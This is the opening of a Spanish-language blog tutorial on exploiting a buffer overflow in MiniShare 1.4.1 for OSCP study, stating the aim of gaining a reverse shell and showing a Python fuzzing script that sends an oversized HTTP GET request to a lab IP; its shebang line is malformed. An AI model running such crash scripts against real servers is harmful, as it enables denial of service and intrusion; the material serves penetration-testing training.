---
layout: single
title: Buffer Overflow - MiniShare 1.4.1
excerpt: "Primer Post, les escribo un tutorial como hacer un buffer overflow exitoso. Muy recomendado para la OSCP"
date: 2020-10-04
classes: wide
header:
  teaser: /assets/images/title-buffer-overflow-minishare.jpg
  teaser_home_page: true
categories:
  - Exploiting
tags:
  - OSCP
  - Exploiting
---

![](/assets/images/title-buffer-overflow-minishare.jpg)

Ya hace un buen tiempo que no escribia o hacia un video en ninguna plataforma, pero compartir lo aprendido siempre a sido una caracteristica esensial de la comunidad. Esta de mas decir que sin tanto contenido respecto al Hacking o Reversing hoy no seriamos nada, Asi pues aprovechare para  ire aportando contenido y espero que alguien le sirva.

En este articulo haremos un buffer overflow al software Minishare 1.4.1, desbordaremos el buffer y aprovecharemos esa vulnerabilidad para ejecutar una shell que se conecte a la maquina atacante.

#### Example

Primero para empezar crearemos una script y ver como reacciona la aplicacion al mandarle unas strings 

```python
#!/usr/local/bin
import socket

ip = '192.168.1.34'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
buffer = 'GET ' + 'A'*3000 + 'HTTP/1.1\r\n\r\n'
s.send(buffer)
s.close()
```

